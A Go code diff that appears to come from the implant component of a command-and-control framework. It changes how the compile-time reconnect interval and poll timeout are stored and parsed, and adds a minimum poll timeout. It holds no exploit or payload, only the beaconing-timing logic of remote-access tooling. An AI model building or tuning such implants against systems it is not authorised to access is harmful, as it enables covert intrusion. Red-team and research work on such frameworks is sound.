@@ -33,8 +33,8 @@ var (
 	}
 
 	maxErrors         = getMaxConnectionErrors()
-	reconnectInterval = int64(0)
-	pollTimeout       = int64(0)
+	reconnectInterval = time.Duration(0)
+	pollTimeout       = time.Duration(0)
 
 	ccCounter = new(int)
 
@@ -103,36 +103,42 @@ func randomCCDomain(next string) string {
 
 // GetReconnectInterval - Parse the reconnect interval inserted at compile-time
 func GetReconnectInterval() time.Duration {
-	if reconnectInterval == -1 {
+	if reconnectInterval == time.Duration(0) {
 		reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
 		if err != nil {
-			return 60 * time.Second
+			reconnectInterval = 60 * time.Second
+		} else {
+			reconnectInterval = time.Duration(reconnect)
 		}
-		return time.Duration(reconnect)
-	} else {
-		return time.Duration(reconnectInterval)
 	}
+	return reconnectInterval
 }
 
+// SetReconnectInterval - Set the running reconnect interval
 func SetReconnectInterval(interval int64) {
-	reconnectInterval = interval
+	reconnectInterval = time.Duration(interval)
 }
 
 // GetPollTimeout - Parse the poll interval inserted at compile-time
 func GetPollTimeout() time.Duration {
-	if pollTimeout == -1 {
-		pollTimeout, err := strconv.Atoi(`{{.Config.PollTimeout}}`)
+	minTimeout := 10 * time.Second // Somewhat arbitrary minimum poll timeout
+	if pollTimeout == time.Duration(0) {
+		poll, err := strconv.Atoi(`{{.Config.PollTimeout}}`)
 		if err != nil {
-			return 1 * time.Second
+			pollTimeout = minTimeout
+		} else {
+			pollTimeout = time.Duration(poll)
 		}
-		return time.Duration(pollTimeout) * time.Second
-	} else {
-		return time.Duration(pollTimeout) * time.Second
 	}
+	if pollTimeout < minTimeout {
+		return minTimeout
+	}
+	return pollTimeout
 }
 
-func SetPollTimeout(seconds int64) {
-	pollTimeout = seconds
+// SetPollTimeout - Set the running poll timeout
+func SetPollTimeout(timeout int64) {
+	pollTimeout = time.Duration(timeout)
 }
 
 func getMaxConnectionErrors() int {
